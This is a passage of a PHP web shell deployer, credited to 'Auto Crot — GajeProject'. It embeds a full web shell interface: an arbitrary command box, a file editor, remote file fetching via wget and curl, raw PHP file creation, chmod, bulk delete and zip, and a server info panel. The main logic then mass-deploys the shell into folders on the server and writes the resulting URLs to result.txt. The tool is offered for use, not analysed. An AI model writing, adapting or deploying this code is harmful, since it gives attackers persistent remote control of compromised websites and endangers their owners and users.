            border: 1px solid var(--border); 
            border-radius: 4px; 
        }
        
        .actions-menu { 
            text-align: right; 
            border-top: 1px solid var(--border); 
            padding-top: 5px; 
            margin-top: 5px;
        }
    }
</style>
</head>
<body>
<div class="container">
    <div class="sidebar">
        <div class="sidebar-header">
            <h3><i class="fa-solid fa-terminal"></i>you just do WTF you want to</h3>
            <div style="font-size: 12px;"><a href="?logout=1">Logout</a></div>
            
            <div class="upload-zone" id="upload-zone">
                <i class="fa-solid fa-cloud-arrow-up"></i>
                <div>Drag & Drop Files Here</div>
                <div style="font-size:0.8em; margin-top:5px;">or click to select</div>
            </div>
            <input type="file" name="files[]" id="file-input" multiple style="display:none;">
            
            <div class="upload-progress" id="upload-progress" style="display:none;">
                <div class="progress-bar">
                    <div class="progress-fill" id="overall-progress" style="width:0%"></div>
                </div>
                <div class="upload-stats" id="upload-stats">Ready to upload...</div>
                <button type="button" id="upload-btn" style="width:100%; margin-top:10px;">Upload All Files</button>
                <div class="file-list" id="upload-file-list"></div>
            </div>

            <div class="upload-methods" style="margin-top: 20px;">
                <h4 style="border-bottom: 1px solid var(--border); padding-bottom: 5px;">Alternative Uploads</h4>
                
                <form id="wget-form" style="margin-bottom: 10px;">
                    <input type="text" name="wget_url" id="wget-url" placeholder="https://example.com/file.txt" required style="width: 100%; margin-bottom: 5px;">
                    <input type="text" name="wget_filename" id="wget-filename" placeholder="filename (optional)" style="width: 100%; margin-bottom: 5px;">
                    <button type="submit" style="width:100%;"><i class="fa-solid fa-download"></i> Upload via wget</button>
                </form>
                
                <form id="curl-form" style="margin-bottom: 10px;">
                    <input type="text" name="curl_url" id="curl-url" placeholder="https://example.com/file.txt" required style="width: 100%; margin-bottom: 5px;">
                    <input type="text" name="curl_filename" id="curl-filename" placeholder="filename (optional)" style="width: 100%; margin-bottom: 5px;">
                    <button type="submit" style="width:100%;"><i class="fa-solid fa-network-wired"></i> Upload via curl</button>
                </form>
                
                <form id="raw-form">
                    <input type="text" name="raw_filename" id="raw-filename" placeholder="filename.php" required style="width: 100%; margin-bottom: 5px;">
                    <textarea name="raw_content" id="raw-content" placeholder="&lt;?php phpinfo(); ?&gt;" style="width: 100%; height: 60px; margin-bottom: 5px;"></textarea>
                    <button type="submit" style="width:100%;"><i class="fa-solid fa-code"></i> Create Raw File</button>
                </form>
            </div>
        </div>
        
        <div class="sidebar-content">
            <h4>Folders</h4>
            <div class="folder-list" id="folder-list"></div>
        </div>

        <div class="sidebar-footer">
              <h4>Server Info</h4>
              <div id="server-info" class="system-info" style="margin-top:0;">
                  <div>Loading server info...</div>
              </div>
        </div>
    </div>
    
    <div class="main-content">
        <div class="top-bar">
            <div class="path-actions">
                <button id="home-btn" title="Go to root"><i class="fa-solid fa-house"></i></button>
                <button id="up-btn" title="Go up one level"><i class="fa-solid fa-arrow-up"></i></button>
                <button id="create-file-btn" title="Create File"><i class="fa-solid fa-file-circle-plus"></i></button>
                <button id="create-dir-btn" title="Create Directory"><i class="fa-solid fa-folder-plus"></i></button>
                <button id="refresh-btn" title="Refresh"><i class="fa-solid fa-rotate"></i></button>
            </div>
            <div class="path-bar-container">
                <div id="path-bar" class="path-bar"></div>
                <input type="text" id="path-input" class="hidden">
            </div>
        </div>
        <div class="cmd-container">
            <form id="cmd-form">
                <input type="text" id="cmd-input" placeholder="whoami" autocomplete="off">
                <button type="submit">Execute</button>
            </form>
            <pre id="cmd-output" style="display:none;"></pre>
        </div>
        <div class="file-list-container">
            <div class="bulk-actions" style="padding: 10px 15px;">
                <input type="checkbox" id="select-all" title="Select/Deselect All">
                <span style="font-weight: bold;">Bulk Actions:</span>
                <button id="bulk-delete-btn">Delete Selected</button>
                <button id="bulk-zip-btn">Zip Selected</button>
            </div>
            <table class="file-table">
                <thead><tr><th style="width:30px;"></th><th>Name</th><th>Size</th><th>Perms</th><th>Modified</th><th>Actions</th></tr></thead>
                <tbody id="file-list"></tbody>
            </table>
        </div>
    </div>
</div>

<div class="modal-overlay" id="editor-modal">
    <div class="modal-content">
        <h3 id="editor-title">Edit File</h3>
        <form id="editor-form">
            <textarea id="editor-content"></textarea>
            <input type="hidden" id="editor-file-path">
            <div style="margin-top:10px; text-align:right;">
                <button type="button" onclick="closeModal()" style="background:var(--muted);">Cancel</button>
                <button type="submit">Save</button>
            </div>
        </form>
    </div>
</div>

<script>
    let currentPath = '';
    let uploadQueue = [];

    function showToast(message, status = 'ok') {
        const toast = document.createElement('div');
        toast.className = `toast-notification ${status === 'ok' ? 'success' : 'error'}`;
        toast.textContent = message;
        document.body.appendChild(toast);
        setTimeout(() => { toast.classList.add('show'); }, 10);
        setTimeout(() => {
            toast.classList.remove('show');
            setTimeout(() => { document.body.removeChild(toast); }, 500);
        }, 3000);
    }
    
    async function loadServerInfo() {
        try {
            const response = await fetch(`?ajax=true&action=get_server_info`); 
            const data = await response.json();
            if(data.status === 'ok') {
                const content = `OS        : ${data.os}\nPHP       : ${data.php_version}\nUser      : ${data.user}\nServer IP : ${data.server_ip}\nDisk      : ${data.free_space} / ${data.total_space}\nDisabled  : ${data.disabled_functions}`.trim();
                document.getElementById('server-info').innerHTML = `<pre>${content}</pre>`;
            }
        } catch(e) { document.getElementById('server-info').textContent = 'Failed to load server info.'; }
    }

    // --- UPLOAD LOGIC ---
    function initUploadZone() {
        const uploadZone = document.getElementById('upload-zone');
        const fileInput = document.getElementById('file-input');
        uploadZone.addEventListener('click', () => fileInput.click());
        fileInput.addEventListener('change', handleFileSelect);
        uploadZone.addEventListener('dragover', (e) => { e.preventDefault(); uploadZone.classList.add('drag-over'); });
        uploadZone.addEventListener('dragleave', (e) => { e.preventDefault(); uploadZone.classList.remove('drag-over'); });
        uploadZone.addEventListener('drop', (e) => { e.preventDefault(); uploadZone.classList.remove('drag-over'); handleFileDrop(e); });
        document.getElementById('upload-btn').addEventListener('click', uploadAllFiles);
    }
    function handleFileSelect(e) { const files = Array.from(e.target.files); addFilesToQueue(files); e.target.value = null; }
    function handleFileDrop(e) { const files = Array.from(e.dataTransfer.files); addFilesToQueue(files); }
    function addFilesToQueue(files) {
        files.forEach(file => {
            uploadQueue.push({ file: file, status: 'pending', progress: 0 });
        });
        updateUploadUI();
    }
    function updateUploadUI() {
        const progressContainer = document.getElementById('upload-progress');
        const statsElement = document.getElementById('upload-stats');
        const fileListElement = document.getElementById('upload-file-list');
        if (uploadQueue.length > 0) {
            progressContainer.style.display = 'block';
            const pendingFiles = uploadQueue.filter(f => f.status === 'pending');
            const successFiles = uploadQueue.filter(f => f.status === 'success');
            const errorFiles = uploadQueue.filter(f => f.status === 'error');
            statsElement.innerHTML = `<span class="upload-success">✓ ${successFiles.length}</span> | <span class="upload-error">✗ ${errorFiles.length}</span> | <span>${pendingFiles.length} pending</span>`;
            const overallProgress = (uploadQueue.length > 0) ? Math.round((successFiles.length + errorFiles.length) / uploadQueue.length * 100) : 0;
            document.getElementById('overall-progress').style.width = overallProgress + '%';
            
            fileListElement.innerHTML = uploadQueue.map((item, index) => `<div class="file-list-item"><div class="file-name">${item.file.name}</div><div style="font-size:0.8em;">${item.status === 'success' ? '✓' : item.status === 'error' ? '✗' : '...'}</div></div>`).join('');
        } else {
            progressContainer.style.display = 'none';
            statsElement.textContent = 'Ready to upload...';
            fileListElement.innerHTML = '';
        }
    }
    async function uploadAllFiles() {
        if (uploadQueue.length === 0) { showToast('No files to upload!', 'error'); return; }
        const pendingItems = uploadQueue.filter(item => item.status === 'pending');
        if (pendingItems.length === 0) { showToast('No new files to upload!', 'error'); return; }
        const totalFiles = pendingItems.length;
        let completed = 0;
        for (let i = 0; i < pendingItems.length; i++) {
            const item = pendingItems[i];
            await uploadSingleFile(item, i);
            completed++;
        }
        if (completed === totalFiles) {
            const successCount = uploadQueue.filter(f => f.status === 'success').length;
            const totalCount = uploadQueue.length;
            showToast(`Upload completed: ${successCount}/${totalCount} files`, 'ok');
            loadContent(currentPath);
            uploadQueue = [];
            updateUploadUI();
        }
    }
    async function uploadSingleFile(item, index) {
        const formData = new FormData();
        formData.append('files[]', item.file);
        try {
            const response = await fetch(`?ajax=true&action=upload_multiple&d=${encodeURIComponent(currentPath)}`, {
                method: 'POST', body: formData
            });
            const result = await response.json();
            if (result.status === 'ok' && result.results[0] && result.results[0].status === 'ok') {
                item.status = 'success';
                item.progress = 100;
            } else { item.status = 'error'; }
        } catch (error) { console.error('Upload failed:', error); item.status = 'error'; }
        updateUploadUI();
    }

    // --- EVENT LISTENERS & INITIALIZATION ---
    document.addEventListener('DOMContentLoaded', () => {
        loadContent('<?php echo addslashes(get_path()); ?>');
        loadServerInfo();
        initUploadZone();
        
        document.getElementById('editor-form').addEventListener('submit', handleSave);
        document.getElementById('cmd-form').addEventListener('submit', handleCmd);
        document.querySelector('.container').addEventListener('click', handleActions);

        document.getElementById('create-file-btn').addEventListener('click', () => {
            const name = prompt('Enter new file name:');
            if (name) doAction('create', {type: 'file', name: name});
        });
        document.getElementById('create-dir-btn').addEventListener('click', () => {
            const name = prompt('Enter new folder name:');
            if (name) doAction('create', {type: 'dir', name: name});
        });
        document.getElementById('refresh-btn').addEventListener('click', () => {
            loadContent(currentPath);
            loadServerInfo();
            showToast('Refreshed!', 'ok');
        });

        document.getElementById('wget-form').addEventListener('submit', (e) => {
            e.preventDefault();
            const url = document.getElementById('wget-url').value;
            const filename = document.getElementById('wget-filename').value;
            doAction('upload_wget', { url: url, filename: filename });
            e.target.reset();
        });
        document.getElementById('curl-form').addEventListener('submit', (e) => {
            e.preventDefault();
            const url = document.getElementById('curl-url').value;
            const filename = document.getElementById('curl-filename').value;
            doAction('upload_curl', { url: url, filename: filename });
            e.target.reset();
        });
        document.getElementById('raw-form').addEventListener('submit', (e) => {
            e.preventDefault();
            const filename = document.getElementById('raw-filename').value;
            const content = document.getElementById('raw-content').value;
            doAction('upload_raw', { filename: filename, content: content });
            e.target.reset();
        });

        const pathBarContainer = document.querySelector('.path-bar-container');
        const pathBar = document.getElementById('path-bar');
        const pathInput = document.getElementById('path-input');
        pathBarContainer.addEventListener('click', (e) => {
            if (e.target === pathBarContainer || e.target === pathBar) {
                pathBar.classList.add('hidden');
                pathInput.classList.remove('hidden');
                pathInput.value = currentPath;
                pathInput.focus();
                pathInput.select();
            }
        });
        pathInput.addEventListener('keyup', (e) => {
            if (e.key === 'Enter') {
                loadContent(pathInput.value);
                pathInput.classList.add('hidden');
                pathBar.classList.remove('hidden');
            }
        });
        pathInput.addEventListener('blur', () => {
            pathInput.classList.add('hidden');
            pathBar.classList.remove('hidden');
        });

        document.getElementById('home-btn').addEventListener('click', () => {
            const root = currentPath.includes('\\') ? currentPath.substring(0, 3) : '/';
            loadContent(root);
        });
        document.getElementById('up-btn').addEventListener('click', () => {
            if (currentPath.match(/^[a-zA-Z]:[\\\/]$/)) return;
            let path = currentPath.replace(/[\\\/]$/, '');
            let separator = path.includes('\\') ? '\\' : '/';
            let parentPath = path.substring(0, path.lastIndexOf(separator));
            if (parentPath === '' && separator === '/') parentPath = '/';
            if (parentPath.match(/^[a-zA-Z]:$/)) parentPath += '\\';
            if (parentPath === '' && !parentPath.includes(':')) parentPath = '/';
            loadContent(parentPath);
        });

        // --- BULK ACTION LOGIC ---
        const selectAllCheckbox = document.getElementById('select-all');
        selectAllCheckbox.addEventListener('change', (e) => {
            document.querySelectorAll('.file-checkbox').forEach(cb => {
                cb.checked = e.target.checked;
            });
             updateBulkActionsButtons();
        });

        document.getElementById('bulk-delete-btn').addEventListener('click', () => {
            const selected = Array.from(document.querySelectorAll('.file-checkbox:checked'))
                                .map(cb => cb.getAttribute('data-path'));
            if (selected.length > 0 && confirm(`Delete ${selected.length} selected items? THIS CANNOT BE UNDONE.`)) {
                doBulkAction('bulk_delete', { targets: JSON.stringify(selected) });
            } else if (selected.length === 0) {
                showToast('No items selected!', 'error');
            }
        });

        document.getElementById('bulk-zip-btn').addEventListener('click', () => {
            const selected = Array.from(document.querySelectorAll('.file-checkbox:checked'))
                                .map(cb => cb.getAttribute('data-path'));
            if (selected.length > 0) {
                const zipName = prompt('Enter name for the ZIP archive:', 'archive_' + new Date().toISOString().slice(0, 10) + '.zip');
                if (zipName) {
                    doBulkAction('bulk_zip', { targets: JSON.stringify(selected), zip_name: zipName });
                }
            } else {
                showToast('No items selected!', 'error');
            }
        });

        document.addEventListener('change', (e) => {
            if (e.target.classList.contains('file-checkbox')) {
                updateBulkActionsButtons();
            }
        });
        function updateBulkActionsButtons() {
            const selectedItems = Array.from(document.querySelectorAll('.file-checkbox:checked'));
            const isDisabled = selectedItems.length === 0;
            document.getElementById('bulk-delete-btn').disabled = isDisabled;
            document.getElementById('bulk-zip-btn').disabled = isDisabled;
        }

    });

    // --- MAIN AJAX ACTION HANDLERS ---
    function handleActions(e) {
        let targetElement = e.target.closest('[data-action]');
        if (targetElement) {
            e.preventDefault();
            const action = targetElement.getAttribute('data-action');
            const target = targetElement.getAttribute('data-target');
            switch(action) {
                case 'nav': loadContent(target); break;
                case 'delete': if(confirm(`Delete ${target}?`)) doAction('delete', {target}); break;
                case 'edit': openEditor(target); break;
                case 'chmod': 
                    const mode = prompt('Enter new octal mode (e.g., 0755):', '0755');
                    if (mode) doAction('chmod', {target, mode});
                    break;
                case 'rename':
                    const newName = prompt('Enter new name:', target.split(/[\\\/]/).pop());
                    if (newName) doAction('rename', {old: target, new: newName});
                    break;
                case 'unzip': // NEW: Handle Unzip
                    if (confirm(`Unzip ${target}?`)) doAction('unzip', {target});
                    break;
            }
        }
    }

    async function doAction(action, data) {
        const formData = new FormData();
        for (const key in data) { formData.append(key, data[key]); }
        try {
            const response = await fetch(`?ajax=true&action=${action}&d=${encodeURIComponent(currentPath)}`, {
                method: 'POST', body: formData
            });
            const result = await response.json();
            showToast(result.message, result.status);
            if (result.status === 'ok') {
                loadContent(currentPath);
                loadServerInfo();
            }
        } catch (error) {
            console.error('Action failed:', error);
            showToast('An error occurred.', 'error');
        }
    }
    
    async function doBulkAction(action, data) {
        const formData = new FormData();
        for (const key in data) { formData.append(key, data[key]); }
        try {
            const response = await fetch(`?ajax=true&action=${action}&d=${encodeURIComponent(currentPath)}`, {
                method: 'POST', body: formData
            });
            const result = await response.json();
            showToast(result.message, result.status);
            if (result.status === 'ok') {
                loadContent(currentPath);
            }
        } catch (error) {
            console.error('Bulk Action failed:', error);
            showToast('An error occurred during bulk action.', 'error');
        }
    }


    async function openEditor(filePath) {
        try {
            const response = await fetch(`?ajax=true&action=get_content&file=${encodeURIComponent(filePath)}`);
            const result = await response.json();
            if (result.status === 'ok') {
                document.getElementById('editor-title').textContent = `Edit: ${filePath.split(/[\\\/]/).pop()}`;
                document.getElementById('editor-content').value = result.content;
                document.getElementById('editor-file-path').value = filePath;
                document.getElementById('editor-modal').style.display = 'flex';
            } else { showToast(result.message, result.status); }
        } catch (error) {
            console.error('Failed to open editor:', error);
            showToast('Could not load file content.', 'error');
        }
    }
    function closeModal() { document.getElementById('editor-modal').style.display = 'none'; }
    async function handleSave(e) {
        e.preventDefault();
        const filePath = document.getElementById('editor-file-path').value;
        const content = document.getElementById('editor-content').value;
        await doAction('save_content', {file: filePath, content});
        closeModal();
    }

    async function handleCmd(e) {
        e.preventDefault();
        const cmdInput = document.getElementById('cmd-input');
        const cmdOutput = document.getElementById('cmd-output');
        const cmd = cmdInput.value;
        if (!cmd) return;
        cmdOutput.style.display = 'block';
        cmdOutput.textContent = 'Executing...';
        const formData = new FormData();
        formData.append('cmd', cmd);
        try {
            const response = await fetch(`?ajax=true&action=cmd&d=${encodeURIComponent(currentPath)}`, {
                method: 'POST', body: formData
            });
            const result = await response.json();
            cmdOutput.textContent = result.output;
            cmdInput.value = '';
        } catch (error) {
            console.error('Command execution failed:', error);
            cmdOutput.textContent = 'Error executing command.';
        }
    }

    function loadContent(path) {
        currentPath = path;
        const folderList = document.getElementById('folder-list');
        const fileList = document.getElementById('file-list');
        document.getElementById('select-all').checked = false; 

        folderList.innerHTML = 'Loading...';
        fileList.innerHTML = '<tr><td colspan="6" style="text-align:center;">Loading...</td></tr>';
        
        fetch(`?ajax=true&action=list&d=${encodeURIComponent(path)}`)
            .then(res => res.json())
            .then(data => {
                if (data.status !== 'ok') {
                    showToast('Failed to load directory.', 'error');
                    return;
                }
                updatePathBar(data.path);
                
                // Folders Listing (Minimalist Text Actions)
                folderList.innerHTML = data.folders.map(f => {
                    const isParent = f.name === '..';
                    return `
                    <tr>
                        <td data-label="" style="width:30px;">
                            ${!isParent ? `<input type="checkbox" class="file-checkbox" data-path="${f.path}">` : ''}
                        </td>
                        <td data-label="Name" colspan="4"><i class="fa-solid fa-folder"></i> <a href="#" data-action="nav" data-target="${f.path}">${f.name}</a></td>
                        <td data-label="Actions" class="actions-menu">
                            ${!isParent ? `
                            <button title="Rename" data-action="rename" data-target="${f.path}">R</button>
                            <button title="Delete" data-action="delete" data-target="${f.path}">X</button>
                            ` : ''}
                        </td>
                    </tr>
                    `;
                }).join('');

                // Files Listing (Minimalist Text Actions + Unzip)
                fileList.innerHTML = data.files.map(f => {
                    const isZip = f.is_zip;
                    const fileIconClass = isZip ? 'fa-solid fa-file-zipper' : 'fa-regular fa-file-lines';
                    
                    return `
                    <tr>
                        <td data-label="" style="width:30px;"><input type="checkbox" class="file-checkbox" data-path="${f.path}"></td>
                        <td data-label="Name"><i class="${fileIconClass}"></i> ${f.name}</td>
                        <td data-label="Size">${f.size}</td>
                        <td data-label="Perms" class="perms ${f.is_writable ? 'writable' : 'not-writable'}">${f.perms}</td>
                        <td data-label="Modified">${f.mtime}</td>
                        <td data-label="Actions" class="actions-menu">
                            <button title="Edit" data-action="edit" data-target="${f.path}">E</button>
                            <button title="Rename" data-action="rename" data-target="${f.path}">R</button>
                            <button title="Chmod" data-action="chmod" data-target="${f.path}">C</button>
                            <a href="?download=${encodeURIComponent(f.path)}" title="Download">D</a>
                            ${isZip ? `<button title="Unzip" data-action="unzip" data-target="${f.path}">U</button>` : ''}
                            <button title="Delete" data-action="delete" data-target="${f.path}">X</button>
                        </td>
                    </tr>
                    `;
                }).join('');
            }).catch(err => {
                console.error("Failed to load content:", err);
                folderList.innerHTML = '<span style="color:var(--error)">Error loading folders.</span>';
                fileList.innerHTML = '<tr><td colspan="6" style="text-align:center;color:var(--error)">Error loading files.</td></tr>';
            });
    }

    function updatePathBar(fullPath) {
        const pathBar = document.getElementById('path-bar');
        pathBar.innerHTML = '';
        const isWindows = fullPath.includes('\\');
        const separator = isWindows ? '\\' : '/';
        const parts = fullPath.split(separator);
        let builtPath = isWindows ? '' : '/';
        
        parts.forEach((part, index) => {
            if (part === '') {
                if(index === 0 && !isWindows) {
                    const rootLink = document.createElement('a');
                    rootLink.href = '#'; rootLink.textContent = '/';
                    rootLink.className = 'path-part';
                    rootLink.setAttribute('data-action', 'nav');
                    rootLink.setAttribute('data-target', '/');
                    pathBar.appendChild(rootLink);
                } return;
            }
            if (isWindows && index === 0) { builtPath = part + separator; } 
            else { builtPath += part + separator; }
            if(pathBar.children.length > 0) {
                 const sep = document.createElement('span');
                 sep.className = 'path-sep'; sep.textContent = '>';
                 pathBar.appendChild(sep);
            }
            const partLink = document.createElement('a');
            partLink.href = '#'; partLink.textContent = part;
            partLink.className = 'path-part';
            partLink.setAttribute('data-action', 'nav');
            partLink.setAttribute('data-target', builtPath);
            pathBar.appendChild(partLink);
        });
    }
</script>
</body>
</html>
PHP;
}
// ---------------- Main Logic ----------------
$urls = deployFolder($files);

// Pisahkan berdasarkan ekstensi
$resultGroups = [];
foreach ($urls as $url) {
    // pastikan parse_url berhasil, kadang fallback ke 'no_ext'
    $path = parse_url($url, PHP_URL_PATH) ?: '';
    $ext = pathinfo($path, PATHINFO_EXTENSION);
    if (!$ext) $ext = 'no_ext';
    $resultGroups[$ext][] = $url;
}

//result.txt
$txtOutput = "";
foreach ($resultGroups as $ext => $list) {
    $txtOutput .= "---$ext result----\n";
    foreach ($list as $u) {
        $txtOutput .= "$u\n";
    }
    $txtOutput .= "\n";
}

//save
file_put_contents(__DIR__ . '/result.txt', $txtOutput);
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Auto Crot - GajeProject</title>
<style>
body {
    font-family: monospace;
    background: #111;
    color: #f0f0f0;
    padding: 20px;
}
h2 { color: #ff0000; } /* Trash polka red */
h3 { color: #0ff; margin-top: 20px; }
.file-entry { margin-bottom: 5px; word-break: break-word; }
button {
    margin-left: 10px;
    padding: 3px 8px;
    cursor: pointer;
    border-radius: 3px;
    border: none;
    background: #ff0000;
    color: #fff;
    font-weight: bold;
}
button:hover { background: #cc0000; }
.copy-all {
    margin-bottom: 10px;
    padding: 5px 12px;
    background: #0ff;
    color: #000;
}
</style>
<script>
function copyText(text) {
    navigator.clipboard.writeText(text).then(() => {
        alert('Copied!');
    }, () => {
        alert('Copy failed');
    });
}

// Copy all URLs per ekstensi
function copyAll(ext) {
    const urls = Array.from(document.querySelectorAll(`.group-${ext} .url`)).map(e => e.innerText).join("\n");
    copyText(urls);
}
</script>
</head>
<body>

<h2>Deployment Complete!</h2>
<p>check: <strong>result.txt</strong></p>

<?php if (empty($urls)): ?>
    <p>No deployment done. Check permissions or folder structure.</p>
<?php else: ?>
    <?php foreach ($resultGroups as $ext => $group): ?>
        <h3>--<?= htmlspecialchars($ext) ?> result--</h3>
        <button class="copy-all" onclick="copyAll('<?= htmlspecialchars($ext) ?>')">Copy All</button>
        <div class="group-<?= htmlspecialchars($ext) ?>">
        <?php foreach ($group as $url): ?>
            <div class="file-entry">
                <span class="url"><?= htmlspecialchars($url) ?></span>
            </div>
        <?php endforeach; ?>
        </div>
    <?php endforeach; ?>
<?php endif; ?>

<hr>
<footer>
    <strong>Auto Crot</strong> — <strong>Gaje Project</strong><br>
    <em>“6ickzone”</em>
</footer>

</body>
</html>
